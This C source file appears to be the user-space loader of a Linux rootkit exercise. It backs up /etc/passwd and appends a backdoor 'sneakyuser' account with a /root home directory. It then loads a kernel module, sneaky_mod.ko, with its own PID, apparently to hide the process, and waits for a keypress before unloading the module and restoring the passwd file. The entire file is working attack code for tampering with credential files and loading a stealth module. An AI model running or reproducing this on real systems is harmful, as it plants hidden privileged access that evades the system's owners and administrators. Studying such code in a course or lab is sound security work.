//for asprintf
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>

#include <sys/types.h>
#include <unistd.h>
//1 print pid
void p_pid()
{
    printf("sneaky_process pid = % d\n", getpid());
}

//2 cp pwd & insert pwd
void ch_pwd()
{
    system("cp /etc/passwd /tmp/passwd");
    system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");
}

//3 load module
void load_module()
{
    char *cmd;
    asprintf(&cmd, "insmod sneaky_mod.ko pid=%d", getpid());
    system(cmd);
    free(cmd);
}

//4 loop
void loop()
{
    while (getchar() != 'q')
    {
    }
}

//5 unload module
void unload_module()
{
    system("rmmod sneaky_mod");
}

//6 restore pwd
void restore_pwd()
{
    system("cp /tmp/passwd /etc/passwd");
}

//main
int main()
{
    p_pid();
    ch_pwd();
    load_module();
    loop();
    unload_module();
    restore_pwd();
    return 0;
}